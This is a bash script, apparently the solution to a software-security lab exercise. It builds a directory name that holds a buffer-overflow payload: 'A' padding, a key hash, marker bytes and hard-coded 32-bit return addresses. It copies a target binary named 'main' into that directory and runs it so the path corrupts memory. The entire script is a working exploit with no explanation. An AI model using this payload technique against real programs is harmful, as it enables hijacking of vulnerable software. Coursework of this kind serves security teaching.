#!/bin/bash

PRIVATE_KEY_FILE="private_key"
if [ ! -f "$PRIVATE_KEY_FILE" ]; then
    printf "password" > private_key
fi


HASH=$(sha256sum "$PRIVATE_KEY_FILE" | awk '{print $1}')

DYNAMIC_FOLDER_NAME=$(printf "hiAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA${HASH}AAAAAAAAAAAAAAA\xef\xbe\xaf\xdeAAAAAAAAAAAA\xe4\x9b\x04\x08\xc0\x35\x05\x08\x00\x00\x00\x00\x00\x00\x00\x00")


TARGET_DIR="/home/sse/${DYNAMIC_FOLDER_NAME}"
mkdir -p "${TARGET_DIR}"

FILES=("main" "main.c" "private_key")
for file in "${FILES[@]}"; do
    if [ -f "$file" ]; then
        cp "$file" "${TARGET_DIR}/"
    fi
done

cd "${TARGET_DIR}" || { echo "Directory not changed."; exit 1; }

# execute the main executable in created folder
if [ -x "./main" ]; then
    echo "username\n" | ./main
else
    echo "./main not found"
fi

